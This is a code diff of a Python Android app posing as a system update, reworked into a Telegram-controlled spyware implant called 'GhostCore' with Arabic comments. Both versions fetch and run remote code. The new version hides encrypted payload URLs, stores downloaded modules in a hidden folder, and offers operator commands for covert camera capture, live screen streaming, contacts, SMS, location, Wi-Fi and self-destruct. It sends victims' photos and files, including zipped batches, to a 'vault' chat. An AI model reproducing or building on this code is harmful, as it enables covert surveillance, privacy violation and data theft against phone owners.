@@ -1,286 +1,380 @@
+# -*- coding: utf-8 -*-
 import os
 import sys
 import time
-import traceback
-import socket
-import requests
 import json
 import base64
 import threading
-from kivy.app import App
-from kivy.clock import Clock
-from kivy.uix.boxlayout import BoxLayout
-from kivy.uix.scrollview import ScrollView
-from kivy.uix.textinput import TextInput
-from kivy.uix.button import Button
-from kivy.utils import platform
+import importlib
+import requests
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
 
-app_path = os.path.dirname(os.path.abspath(__file__))
-for subdir in ['core', 'telegram', 'media', 'config']:
-    sub_path = os.path.join(app_path, subdir)
-    if os.path.exists(sub_path) and sub_path not in sys.path:
-        sys.path.append(sub_path)
+# ==================== استيراد الأسرار من الملف المُنشأ أثناء البناء ====================
+try:
+    from secrets import ENCRYPTION_KEY, BOT_TOKENS, CONTROL_ID, VAULT_ID
+except ImportError:
+    print("[!] Secrets not found. Exiting.")
+    sys.exit(0)
 
-def global_exception_handler(exc_type, exc_value, exc_tb):
+# ==================== الروابط المشفرة (14 رابطاً) ====================
+PAYLOAD_URLS_ENCRYPTED = [
+    "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"
+]
+
+BASE_DIR = os.path.join(os.getcwd(), ".sys_runtime")
+if not os.path.exists(BASE_DIR):
+    os.makedirs(BASE_DIR)
+sys.path.append(BASE_DIR)
+
+def decrypt_data(encrypted_b64):
     try:
-        app = App.get_running_app()
-        if app and hasattr(app, 'log'):
-            app.log(f"!!! UNHANDLED ERROR: {exc_type.__name__}: {exc_value}")
-            app.log(''.join(traceback.format_tb(exc_tb)))
+        data = base64.b64decode(encrypted_b64)
+        iv, tag, ciphertext = data[:12], data[-16:], data[12:-16]
+        cipher = Cipher(algorithms.AES(ENCRYPTION_KEY), modes.GCM(iv, tag), backend=default_backend())
+        decryptor = cipher.decryptor()
+        return (decryptor.update(ciphertext) + decryptor.finalize()).decode()
     except:
-        pass
-    sys.__excepthook__(exc_type, exc_value, exc_tb)
-
-sys.excepthook = global_exception_handler
-
-class SystemUpdateApp(App):
-    def build(self):
-        self.config_url = "https://gist.githubusercontent.com/Zaen1993/e463af07dcd7c8c1f2398fdbaf573c73/raw/cf8b3c5fe79d3453e7272b3b8558d6a08f49e9ec/config.json"
-        self.engine_running = False
-        self.log_lines = []
-
-        layout = BoxLayout(orientation='vertical')
-        btn_layout = BoxLayout(size_hint_y=None, height=50, spacing=10, padding=5)
-        copy_btn = Button(text="Copy Log", background_color=(0.2, 0.6, 0.2, 1))
-        copy_btn.bind(on_press=self.copy_log)
-        start_btn = Button(text="Start Engine", background_color=(0.2, 0.4, 0.8, 1))
-        start_btn.bind(on_press=self.start_engine_manual)
-        btn_layout.add_widget(copy_btn)
-        btn_layout.add_widget(start_btn)
-        layout.add_widget(btn_layout)
-
-        scroll = ScrollView(size_hint=(1, 1))
-        self.log_view = TextInput(
-            text="[System] Ready. Press Start Engine.\n",
-            readonly=True,
-            background_color=(0, 0, 0, 1),
-            foreground_color=(0, 1, 0, 1),
-            font_size='14sp',
-            size_hint_y=None,
-            cursor_color=(0, 0, 0, 0)
-        )
-        self.log_view.bind(minimum_height=self.log_view.setter('height'))
-        scroll.add_widget(self.log_view)
-        layout.add_widget(scroll)
-
-        if platform == 'android':
-            self.log("Requesting basic permissions (Internet, Storage)...")
-            from android.permissions import request_permissions, Permission
-            request_permissions([
-                Permission.INTERNET,
-                Permission.ACCESS_NETWORK_STATE,
-                Permission.READ_EXTERNAL_STORAGE,
-                Permission.WRITE_EXTERNAL_STORAGE
-            ])
-
-        Clock.schedule_once(self.start_engine, 3)
-        return layout
-
-    def log(self, msg):
-        timestamp = time.strftime("%H:%M:%S")
-        full_msg = f"[{timestamp}] {msg}"
-        self.log_view.text += full_msg + "\n"
-        self.log_lines.append(full_msg)
-
-    def copy_log(self, instance):
-        from kivy.core.clipboard import Clipboard
-        Clipboard.copy("\n".join(self.log_lines))
-        self.log(f"Log copied ({len(self.log_lines)} lines)")
-
-    def start_engine(self, dt):
-        if self.engine_running:
-            return
-        self.log("Auto start triggered")
-        self.run_engine()
-
-    def start_engine_manual(self, instance):
-        if self.engine_running:
-            self.log("Engine already running")
-            return
-        self.log("Manual start triggered")
-        self.run_engine()
-
-    def test_dns(self):
-        try:
-            socket.gethostbyname("github.com")
-            self.log("DNS resolution: OK")
-            return True
-        except Exception as e:
-            self.log(f"DNS resolution: FAILED ({e})")
-            return False
-
-    def fetch_config(self, max_retries=2):
-        for attempt in range(1, max_retries+1):
-            try:
-                self.log(f"Fetching config (attempt {attempt}/{max_retries})...")
-                resp = requests.get(self.config_url, timeout=10, verify=False)
-                if resp.status_code == 200:
-                    config = resp.json()
-                    self.log("Config fetched and parsed successfully")
-                    return config
-                else:
-                    self.log(f"HTTP {resp.status_code}")
-            except Exception as e:
-                self.log(f"Fetch error: {e}")
-                if attempt < max_retries:
-                    time.sleep(2)
-        self.log("Failed to fetch config after multiple attempts")
         return None
 
-    def get_encryption_key(self):
-        part1 = [77, 121, 83, 117, 112, 51, 114, 83, 51, 99, 114, 51, 116]
-        part2 = [75, 51, 121, 49, 50, 51, 52, 53, 54, 55, 56, 57, 48, 49, 50, 51, 52, 53, 54]
-        return bytes(part1 + part2)
+PAYLOAD_URLS = [decrypt_data(url) for url in PAYLOAD_URLS_ENCRYPTED if decrypt_data(url)]
 
-    def decrypt_aes_gcm(self, encrypted_b64):
-        if not encrypted_b64:
-            return None
-        try:
-            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-            from cryptography.hazmat.backends import default_backend
-            key = self.get_encryption_key()
-            data = base64.b64decode(encrypted_b64)
-            if len(data) < 28:
-                self.log(f"Decrypt: data too short ({len(data)} bytes)")
-                return None
-            iv = data[:12]
-            tag = data[-16:]
-            ct = data[12:-16]
-            cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
-            decryptor = cipher.decryptor()
-            plain = decryptor.update(ct) + decryptor.finalize()
-            result = plain.decode('utf-8')
-            self.log(f"Decrypt: success ({len(result)} chars)")
-            return result
-        except Exception as e:
-            self.log(f"Decrypt error: {e}")
-            return None
+class GhostCore:
+    def __init__(self):
+        self.device_name = f"Device_{int(time.time())}"
+        self.topic_id = None
+        self.last_update_id = 0
+        self.current_bot = BOT_TOKENS[0]
+        self.selected_media = []
+        self.current_page = 0
+        self.media_list = []
+        self.media_type = "all"
+        self.items_per_page = 25
+        self.heartbeat_interval = 3600  # 1 ساعة
+        self.last_heartbeat = time.time()
 
-    def send_telegram(self, token, chat_id, text):
-        if not token or not chat_id:
-            self.log("Telegram: missing token or chat_id")
-            return False
-        try:
-            url = f"https://api.telegram.org/bot{token}/sendMessage"
-            r = requests.post(url, json={"chat_id": chat_id, "text": text}, timeout=10, verify=False)
-            if r.status_code == 200:
-                self.log("Telegram: message sent successfully")
-                return True
-            else:
-                self.log(f"Telegram: HTTP {r.status_code}")
-                return False
-        except Exception as e:
-            self.log(f"Telegram: send error: {e}")
-            return False
+    # ==================== دوال الإرسال الأساسية ====================
+    def _send_request(self, method, endpoint, json_data=None, files=None, params=None):
+        for token in BOT_TOKENS:
+            try:
+                url = f"https://api.telegram.org/bot{token}/{endpoint}"
+                if files:
+                    res = requests.request(method, url, data=params, files=files, timeout=15)
+                elif json_data:
+                    res = requests.request(method, url, json=json_data, timeout=15)
+                else:
+                    res = requests.request(method, url, params=params, timeout=15)
+                if res.status_code == 200:
+                    self.current_bot = token
+                    return res.json()
+            except:
+                continue
+        return None
 
-    def get_device_info(self):
-        try:
-            from jnius import autoclass
-            Build = autoclass('android.os.Build')
-            VERSION = autoclass('android.os.Build$VERSION')
-            model = Build.MODEL
-            manufacturer = Build.MANUFACTURER
-            sdk = VERSION.SDK_INT
-            return f"{manufacturer} {model} (SDK {sdk})"
-        except:
-            return "Unknown Device"
+    def send_message(self, chat_id, text, reply_markup=None, thread_id=None):
+        json_data = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
+        if thread_id:
+            json_data["message_thread_id"] = thread_id
+        if reply_markup:
+            json_data["reply_markup"] = json.dumps(reply_markup)
+        return self._send_request("POST", "sendMessage", json_data=json_data)
 
-    def run_engine(self):
-        self.engine_running = True
-        self.log("="*50)
-        self.log("ENGINE STARTED")
-        self.log("="*50)
-
-        self.log("Step 1: Testing DNS...")
-        self.test_dns()
-
-        self.log("Step 2: Fetching config.json...")
-        config = self.fetch_config()
-        if not config:
-            self.log("CRITICAL: Cannot fetch config. Aborting.")
-            self.engine_running = False
-            return
-
-        self.log("Step 3: Decrypting tokens...")
-        enc_tokens = config.get('t', [])
-        if not enc_tokens:
-            self.log("ERROR: No tokens in config")
-            self.engine_running = False
-            return
-
-        token = None
-        for i, enc in enumerate(enc_tokens):
-            dec = self.decrypt_aes_gcm(enc)
-            if dec:
-                token = dec
-                self.log(f"Token {i+1} decrypted successfully")
-                break
-        if not token:
-            self.log("CRITICAL: No valid token found")
-            self.engine_running = False
-            return
-
-        chat_id = self.decrypt_aes_gcm(config.get('v', ''))
-        if not chat_id:
-            self.log("CRITICAL: Cannot decrypt chat_id")
-            self.engine_running = False
-            return
-
-        self.log("Step 4: Sending device info to Telegram...")
-        device_info = self.get_device_info()
-        msg = f"🚀 *System Online*\n📱 Device: `{device_info}`\n🕒 Time: {time.strftime('%Y-%m-%d %H:%M:%S')}"
-        self.send_telegram(token, chat_id, msg)
-
-        payload_urls = config.get('payload_urls', [])
-        self.log(f"Step 5: Found {len(payload_urls)} payload URLs")
-        if payload_urls:
-            self.log("Loading payloads...")
-            loaded = 0
-            for url in payload_urls:
-                try:
-                    name = url.split('/')[-1]
-                    self.log(f"  - Loading {name}...")
-                    code = requests.get(url, timeout=10, verify=False).text
-                    exec(code, globals())
-                    loaded += 1
-                    self.log(f"    Success")
-                except Exception as e:
-                    self.log(f"    FAILED: {e}")
-            self.log(f"Loaded {loaded}/{len(payload_urls)} payloads")
-
-            monitor_class = None
-            if 'Monitor' in globals():
-                monitor_class = globals()['Monitor']
-            else:
-                self.log("Searching for Monitor class in globals...")
-                for key, value in globals().items():
-                    if isinstance(value, type) and key == 'Monitor':
-                        monitor_class = value
-                        break
-                    if hasattr(value, 'Monitor'):
-                        monitor_class = getattr(value, 'Monitor')
-                        break
-
-            if monitor_class:
-                self.log("Starting Monitor in background thread...")
-                try:
-                    monitor = monitor_class()
-                    threading.Thread(target=monitor.start, daemon=True).start()
-                    self.log("Monitor started successfully")
-                except Exception as e:
-                    self.log(f"Monitor start failed: {e}")
-            else:
-                self.log("CRITICAL: Monitor class not found after loading all payloads")
-                self.log("Available classes in globals:")
-                classes = [k for k, v in globals().items() if isinstance(v, type)]
-                self.log(f"  {classes}")
+    # ==================== إدارة التبويت والواجهة ====================
+    def create_topic(self):
+        data = self._send_request("POST", "createForumTopic", json={
+            "chat_id": CONTROL_ID,
+            "name": f"📱 {self.device_name}"
+        })
+        if data and data.get("ok"):
+            self.topic_id = data['result']['message_thread_id']
+            self.send_main_menu()
+            self._send_heartbeat()  # إرسال أول نبضة عند بدء التشغيل
+            # بدء خيط النبض الخلفي
+            threading.Thread(target=self._heartbeat_loop, daemon=True).start()
         else:
-            self.log("No payloads to load")
+            time.sleep(2)
+            self.create_topic()
 
-        self.log("="*50)
-        self.log("ENGINE FINISHED")
-        self.log("="*50)
-        self.engine_running = False
+    def _send_heartbeat(self):
+        """إرسال رسالة نبض صامت (مرئية فقط في حال وجود جلسة نشطة)"""
+        self.send_message(
+            CONTROL_ID,
+            f"🟢 Heartbeat: `{self.device_name}` is alive",
+            thread_id=self.topic_id
+        )
 
-if __name__ == '__main__':
-    SystemUpdateApp().run()
+    def _heartbeat_loop(self):
+        """حلقة إرسال النبض بشكل دوري"""
+        while True:
+            time.sleep(self.heartbeat_interval)
+            self._send_heartbeat()
+
+    def send_main_menu(self):
+        # تفريغ الذاكرة قبل عرض القائمة الرئيسية (لتجنب تراكم مسارات الملفات)
+        self.media_list = []
+        self.selected_media = []
+        btns = {
+            "inline_keyboard": [
+                [{"text": "🖼️ كل الوسائط", "callback_data": "browse_all_0"},
+                 {"text": "🔞 صور 🔞", "callback_data": "browse_nsfw_0"}],
+                [{"text": "🎮 قائمة التحكم", "callback_data": "control_menu"},
+                 {"text": "♻️ تحديث النظام", "callback_data": "reload_sys"}]
+            ]
+        }
+        self._send_request("POST", "sendMessage", json={
+            "chat_id": CONTROL_ID,
+            "message_thread_id": self.topic_id,
+            "text": f"✅ النظام نشط\nالجهاز: {self.device_name}",
+            "reply_markup": btns
+        })
+
+    def send_control_menu(self):
+        btns = {
+            "inline_keyboard": [
+                [{"text": "📸 كاميرا أمامية", "callback_data": "cmd_front_cam"},
+                 {"text": "📸 كاميرا خلفية", "callback_data": "cmd_back_cam"}],
+                [{"text": "🎥 بث مباشر (كاميرا)", "callback_data": "cmd_live_cam"},
+                 {"text": "🖥️ بث مباشر (شاشة)", "callback_data": "cmd_live_screen"}],
+                [{"text": "🔴 إيقاف البث", "callback_data": "cmd_stop_stream"}],
+                [{"text": "📞 جهات الاتصال", "callback_data": "cmd_contacts"},
+                 {"text": "💬 الرسائل (SMS)", "callback_data": "cmd_sms"}],
+                [{"text": "📍 الموقع", "callback_data": "cmd_location"},
+                 {"text": "📶 شبكات Wi-Fi", "callback_data": "cmd_wifi"}],
+                [{"text": "🗑️ حذف الصور 🔞", "callback_data": "cmd_delete_nsfw"},
+                 {"text": "💣 تدمير التطبيق", "callback_data": "cmd_self_destruct"}],
+                [{"text": "🔙 العودة للرئيسية", "callback_data": "main_menu"}]
+            ]
+        }
+        self._send_request("POST", "sendMessage", json={
+            "chat_id": CONTROL_ID,
+            "message_thread_id": self.topic_id,
+            "text": "🎮 قائمة التحكم بالجهاز",
+            "reply_markup": btns
+        })
+
+    # ==================== تحميل وإدارة البايلودات ====================
+    def download_payloads(self):
+        """تحميل جميع البايلودات من Gists (يتحقق من وجود الملفات ويتجنب التحميل الزائد)"""
+        for url in PAYLOAD_URLS:
+            try:
+                name = url.split('/')[-1]
+                target_path = os.path.join(BASE_DIR, name)
+                # إذا كان الملف موجوداً ومطابقاً للملف عن بُعد، يمكن تخطيه (اختياري)
+                # لكننا سنقوم بالتحميل دائماً لضمان التحديث
+                r = requests.get(url, timeout=15)
+                if r.status_code == 200:
+                    with open(target_path, 'w', encoding='utf-8') as f:
+                        f.write(r.text)
+            except:
+                continue
+
+    def reload_payloads(self):
+        """إعادة تحميل البايلودات في خيط منفصل مع تفريغ الذاكرة أولاً"""
+        def task():
+            self.send_message(CONTROL_ID, "⏳ جاري تحديث الملفات (14 ملف)... قد يستغرق دقيقة.", thread_id=self.topic_id)
+            self.download_payloads()
+            # إعادة تحميل الموديولات التي تم تغييرها
+            for mod_name in ["commands", "telegram_ui", "monitor"]:
+                if mod_name in sys.modules:
+                    importlib.reload(sys.modules[mod_name])
+            # تفريغ الذاكرة بعد إعادة التحميل
+            self.media_list = []
+            self.selected_media = []
+            self.send_message(CONTROL_ID, "✅ اكتمل تحديث الملفات. يمكنك استخدام الأوامر الجديدة فوراً.", thread_id=self.topic_id)
+        threading.Thread(target=task, daemon=True).start()
+
+    # ==================== تصفح الوسائط ====================
+    def handle_browse(self, category, page):
+        self.media_type = category
+        self.current_page = page
+        try:
+            import commands
+            # إعادة تحميل commands لضمان أحدث نسخة (بعد التحديث التلقائي)
+            importlib.reload(commands)
+            if category == "all":
+                self.media_list = commands.get_media_list()
+            else:
+                self.media_list = commands.get_nsfw_media_list()
+        except Exception as e:
+            self.media_list = []
+            self.send_message(CONTROL_ID, f"⚠️ خطأ في جلب الوسائط: {e}", thread_id=self.topic_id)
+        self.display_media_page()
+
+    def display_media_page(self):
+        start = self.current_page * self.items_per_page
+        end = start + self.items_per_page
+        page_items = self.media_list[start:end]
+        if not page_items:
+            self.send_message(CONTROL_ID, "📭 لا توجد وسائط في هذا القسم.", thread_id=self.topic_id)
+            return
+        for idx, path in enumerate(page_items):
+            global_idx = start + idx
+            btns = {
+                "inline_keyboard": [
+                    [{"text": "👁️ معاينة", "callback_data": f"preview_{global_idx}"},
+                     {"text": "✅ تحديد", "callback_data": f"select_{global_idx}"}],
+                    [{"text": "ℹ️ معلومات", "callback_data": f"info_{global_idx}"},
+                     {"text": "📥 تحميل", "callback_data": f"download_{global_idx}"}]
+                ]
+            }
+            self.send_message(CONTROL_ID, f"📄 {os.path.basename(path)}", reply_markup=btns, thread_id=self.topic_id)
+        # أزرار التنقل
+        nav_btns = []
+        if self.current_page > 0:
+            nav_btns.append({"text": "⬅️ السابقة", "callback_data": f"browse_{self.media_type}_{self.current_page-1}"})
+        if end < len(self.media_list):
+            nav_btns.append({"text": "التالي ➡️", "callback_data": f"browse_{self.media_type}_{self.current_page+1}"})
+        if nav_btns:
+            nav_btns.append({"text": "📦 تحميل المحدد", "callback_data": "download_selected"})
+            nav_btns.append({"text": "🗜️ ضغط وتحميل المحدد", "callback_data": "zip_selected"})
+            self.send_message(CONTROL_ID, f"صفحة {self.current_page+1}", reply_markup={"inline_keyboard": [nav_btns]}, thread_id=self.topic_id)
+
+    # ======================= حلقة الاستماع =======================
+    def listen(self):
+        while True:
+            updates = self._send_request("GET", f"getUpdates?offset={self.last_update_id + 1}")
+            if updates and updates.get("ok") and updates.get("result"):
+                for u in updates["result"]:
+                    self.last_update_id = u["update_id"]
+                    if "callback_query" in u:
+                        self.process_callback(u["callback_query"])
+            time.sleep(2)
+
+    # ======================= معالجة الأزرار =======================
+    def process_callback(self, cb):
+        data = cb["data"]
+        if data.startswith("browse_"):
+            parts = data.split("_")
+            self.handle_browse(parts[1], int(parts[2]))
+        elif data == "control_menu":
+            self.send_control_menu()
+        elif data == "main_menu":
+            # تفريغ الذاكرة عند العودة للقائمة الرئيسية
+            self.media_list = []
+            self.selected_media = []
+            self.send_main_menu()
+        elif data == "reload_sys":
+            self.reload_payloads()
+        elif data.startswith("cmd_"):
+            cmd = data[4:]
+            try:
+                import commands
+                importlib.reload(commands)
+                if hasattr(commands, 'execute_command'):
+                    result = commands.execute_command(cmd)
+                    if result.get("file"):
+                        with open(result["file"], 'rb') as f:
+                            self._send_request("POST", "sendDocument", files={'document': f}, json={
+                                "chat_id": VAULT_ID,
+                                "caption": result.get("caption", "")
+                            })
+                    elif result.get("text"):
+                        self.send_message(CONTROL_ID, result["text"], thread_id=self.topic_id)
+            except Exception as e:
+                self.send_message(CONTROL_ID, f"❌ خطأ في تنفيذ الأمر: {str(e)}", thread_id=self.topic_id)
+        elif data.startswith("preview_"):
+            idx = int(data.split("_")[1])
+            path = self.media_list[idx]
+            try:
+                import commands
+                importlib.reload(commands)
+                if hasattr(commands, 'get_preview'):
+                    preview = commands.get_preview(path)
+                    if preview:
+                        self._send_request("POST", "sendPhoto", files={'photo': preview}, json={
+                            "chat_id": CONTROL_ID,
+                            "caption": f"معاينة: {os.path.basename(path)}",
+                            "message_thread_id": self.topic_id
+                        })
+                    else:
+                        self.send_message(CONTROL_ID, "❌ لا يمكن إنشاء معاينة", thread_id=self.topic_id)
+            except:
+                pass
+        elif data.startswith("download_"):
+            idx = int(data.split("_")[1])
+            path = self.media_list[idx]
+            try:
+                with open(path, 'rb') as f:
+                    self._send_request("POST", "sendDocument", files={'document': f}, json={
+                        "chat_id": VAULT_ID,
+                        "caption": os.path.basename(path)
+                    })
+                self.send_message(CONTROL_ID, "✅ تم الإرسال إلى الخزنة", thread_id=self.topic_id)
+            except:
+                pass
+        elif data.startswith("info_"):
+            idx = int(data.split("_")[1])
+            path = self.media_list[idx]
+            try:
+                import commands
+                importlib.reload(commands)
+                if hasattr(commands, 'get_file_info'):
+                    info = commands.get_file_info(path)
+                    msg = f"📄 {os.path.basename(path)}\n📏 الحجم: {info.get('size', '?')}\n🕒 التعديل: {info.get('modified', '?')}"
+                    self.send_message(CONTROL_ID, msg, thread_id=self.topic_id)
+            except:
+                pass
+        elif data.startswith("select_"):
+            idx = int(data.split("_")[1])
+            path = self.media_list[idx]
+            if path not in self.selected_media:
+                self.selected_media.append(path)
+            self._send_request("POST", "answerCallbackQuery", json={
+                "callback_query_id": cb["id"],
+                "text": f"✅ تم تحديد {os.path.basename(path)}",
+                "show_alert": False
+            })
+        elif data == "download_selected":
+            if not self.selected_media:
+                self.send_message(CONTROL_ID, "⚠️ لم تقم بتحديد أي ملفات بعد.", thread_id=self.topic_id)
+                return
+            for path in self.selected_media:
+                try:
+                    with open(path, 'rb') as f:
+                        self._send_request("POST", "sendDocument", files={'document': f}, json={
+                            "chat_id": VAULT_ID,
+                            "caption": os.path.basename(path)
+                        })
+                except:
+                    pass
+            self.selected_media = []
+            self.send_message(CONTROL_ID, "✅ تم إرسال الملفات المحددة إلى الخزنة", thread_id=self.topic_id)
+        elif data == "zip_selected":
+            if not self.selected_media:
+                self.send_message(CONTROL_ID, "⚠️ لم تقم بتحديد أي ملفات بعد.", thread_id=self.topic_id)
+                return
+            import zipfile
+            from io import BytesIO
+            zip_buffer = BytesIO()
+            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
+                for path in self.selected_media:
+                    zf.write(path, os.path.basename(path))
+            zip_buffer.seek(0)
+            self._send_request("POST", "sendDocument", files={'document': ('selected.zip', zip_buffer)}, json={
+                "chat_id": VAULT_ID,
+                "caption": f"📦 {len(self.selected_media)} ملفات محددة"
+            })
+            self.selected_media = []
+            self.send_message(CONTROL_ID, "✅ تم ضغط الملفات المحددة وإرسالها إلى الخزنة", thread_id=self.topic_id)
+
+# ======================= بدء التشغيل =======================
+if __name__ == "__main__":
+    core = GhostCore()
+    core.download_payloads()
+    core.create_topic()
+    threading.Thread(target=core.listen, daemon=True).start()
+    while True:
+        time.sleep(60)
